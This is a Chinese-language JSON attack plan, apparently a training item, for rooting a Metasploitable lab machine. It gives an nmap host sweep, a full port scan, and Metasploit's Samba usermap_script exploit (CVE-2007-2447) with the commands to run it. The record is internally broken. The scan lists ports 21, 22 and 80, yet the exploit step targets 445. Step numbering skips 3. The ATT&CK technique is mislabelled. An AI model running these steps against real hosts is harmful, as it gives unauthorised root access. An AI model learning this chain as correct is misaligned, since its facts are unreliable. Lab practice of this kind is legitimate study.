{
   "description": {
     "name": "Metasploitable:1",
     "target": "获取靶机root权限",
     "network_segment": "192.168.92.0/24",
     "operating_system": "unknown"
   },
   "steps": [
     {
       "sub_task_desc": "已知攻击机所在网段，并且靶机和攻击机处于同一网段下，应该执行发现IP地址任务来获取靶机IP地址。",
       "task": {
         "name": "发现IP地址",
         "order": "1",
         "tactics": "侦察目标",
         "techniques": "T1595.001 主动扫描.扫描IP块",
         "tool": ["Nmap"],
         "input": "network_segment",
         "output": "target_ip",
         "detailed_steps": [
           "使用nmap工具扫描靶机所在网段：nmap -sP 192.168.92.0/24，发现靶机IP地址为target_ip。"
         ]
       }
     },
     {
       "sub_task_desc": "已知目标靶机IP地址，应该执行扫描开放端口任务来获取靶机开放端口信息。",
       "task": {
         "name": "扫描开放端口",
         "order": "2",
         "tactics": "侦察目标",
         "techniques": "T1046 网络服务发现",
         "tool": ["Nmap"],
         "input": "target_ip",
         "output": "靶机开放端口信息",
         "detailed_steps": [
           "使用nmap工具扫描端口：nmap -A target_ip -p 1-65535，得到靶机开放端口：21、22、80。"
         ]
       }
     },
     {
       "sub_task_desc": "当获取到靶机开放端口445后，通过搜索发现对应的一个远程命令注入漏洞：CVE-2007-2447。应该执行获取shell任务，使用MSF的exploit/multi/samba/usermap_script模块利用此漏洞，获取到root权限。",
       "task": {
         "name": "获取shell",
         "order": "4",
         "tactics": "权限提升",
         "techniques": "T1037.005 启动或登录初始化脚本.启动项",
         "tool": ["msf"],
         "input": "shell信息",
         "output": "root权限",
         "detailed_steps": [
           "首先执行命令msfconsole打开msf控制台，然后执行命令use exploit/multi/samba/usermap_script进入到该漏洞的攻击模块。",
           "执行set rhosts target_ip命令将被攻击对象设置为目标靶机，然后运行exploit命令进行攻击，拿到root权限。"
         ]
       }
     }
   ]
 }


